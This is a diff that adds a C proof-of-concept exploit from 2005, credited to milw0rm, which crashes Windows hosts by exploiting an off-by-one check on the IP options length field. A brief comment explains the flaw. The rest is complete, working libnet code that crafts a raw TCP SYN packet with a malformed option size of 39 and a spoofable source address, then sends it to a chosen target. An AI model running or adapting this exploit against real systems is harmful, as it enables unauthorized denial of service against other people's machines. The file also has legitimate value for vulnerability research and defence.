@@ -1,0 +1,144 @@
+/* ecl-winipdos.c - 16/04/05
+ * Yuri Gushin <yuri@eclipse.org.il>
+ * Alex Behar <alex@eclipse.org.il>
+ *
+ * This one was actually interesting, an off-by-one by our beloved
+ * M$ :)
+ *
+ * When processing an IP packet with an option size (2nd byte after
+ * the option) of 39, it will crash - since the maximum available
+ * size is 40 for the whole IP options field, and two are already used:
+ *                 [ OPT ] [ SIZE ] [ 38 more bytes ]
+ * Checks are done to validate that the option-size field is less than
+ * 40, where a value less than !39! should be checked for validation.
+ *
+ * Note that this doesn't affect ALL options, and is also dependant upon
+ * the underlying protocol.
+ * Anyways, a small PoC to see how it works and why, tweak test and
+ * explore, have fun :)
+ *
+ *
+ * Greets fly out to the ECL crew, Valentin Slavov, blexim, stranger,
+ * manevski, elius, shrink, Evgeny Pinchuk, Ishay Sommer, and anyone else
+ * who got left out :D
+ *
+ */
+
+
+#ifndef _BSD_SOURCE
+#define _BSD_SOURCE
+#endif
+
+#include <stdio.h>
+#include <string.h>
+#include <time.h>
+#include <libnet.h>
+
+#define IP_H 20
+#define IPOPTS_MAX 40
+
+void banner();
+void usage(char *);
+
+int main(int argc, char **argv)
+{
+  char errbuf[LIBNET_ERRBUF_SIZE];
+  libnet_t *l;
+  char *device = NULL;
+
+  int c;
+  u_char *buf;
+  int packet_len = 0;
+  
+  struct ip *IP;
+  struct tcphdr *TCP;
+  u_int32_t src = 0, dst = 0;
+
+ 
+  banner();
+  if (argc < 4) usage(argv[0]);
+
+  if ((l = libnet_init(LIBNET_RAW4, device, errbuf)) == NULL) {
+    fprintf(stderr, "libnet_init() failed: %s", errbuf);
+    exit(-1);
+  }
+  
+  if ((src = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1) {
+    fprintf(stderr, "Unresolved source address\n");
+    exit(-1);
+  }
+  if ((dst = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE)) == -1) {
+    fprintf(stderr, "Unresolved destination address\n");
+    exit(-1);
+  }
+
+  if ( (buf = malloc(IP_MAXPACKET)) == NULL ) {
+    perror("malloc");
+    exit(-1);
+  }
+
+  buf[20] = atoi(argv[3]);
+  buf[21] = 39;                      // our malformed size
+
+  for (c = 0; c<38; c+=3)
+    strncpy(&buf[22+c], "ECL", 3);   // padding
+
+  TCP = (struct tcphdr *)(buf + IP_H + IPOPTS_MAX);
+  TCP->th_off = 5;
+
+  packet_len = IP_H + IPOPTS_MAX + (TCP->th_off << 2);
+
+  srand(time(NULL));
+  IP = (struct ip *) buf;
+  IP->ip_v    = 4;                   /* version 4 */
+  IP->ip_hl   = 5 + (IPOPTS_MAX / 4);/* 60 byte header */
+  IP->ip_tos  = 0;                   /* IP tos */
+  IP->ip_len  = htons(packet_len);   /* total length */
+  IP->ip_id   = rand();              /* IP ID */
+  IP->ip_off  = htons(0);            /* fragmentation flags */
+  IP->ip_ttl  = 64;                  /* time to live */
+  IP->ip_p    = IPPROTO_TCP;         /* transport protocol */
+  IP->ip_sum  = 0;
+  IP->ip_src.s_addr = src;
+  IP->ip_dst.s_addr = dst;
+
+  TCP->th_sport = htons(1337);
+  TCP->th_dport = htons(80);
+  TCP->th_seq	= 0;
+  TCP->th_ack	= 0;
+  TCP->th_x2	= 0;
+  TCP->th_flags	= TH_SYN;
+  TCP->th_win	= rand() & 0xffff;
+  TCP->th_sum	= 0;
+  TCP->th_urp = 0;
+
+  libnet_do_checksum(l, (u_int8_t *)buf, IPPROTO_TCP, TCP->th_off << 2);
+
+  if ((c = libnet_write_raw_ipv4(l, buf, packet_len)) == -1)
+    {
+      fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
+      exit(-1);
+    }
+            
+  printf("Packet sent.\n");
+
+  libnet_destroy(l);
+  free(buf);
+  return (0);
+}
+
+void usage(char *cmd)
+{
+  printf("Usage: %s <source> <destination> <option>\n",cmd);
+  exit(-1);
+}
+
+void banner()
+{
+  printf("\t\tWindows malformed IP Options DoS exploit\n"
+         "\t\t   Yuri Gushin <yuri@eclipse.org.il>\n"
+         "\t\t    Alex Behar <alex@eclipse.org.il>\n"
+         "\t\t\t       ECL Team\n\n\n");
+}
+
+// milw0rm.com [2005-04-17]
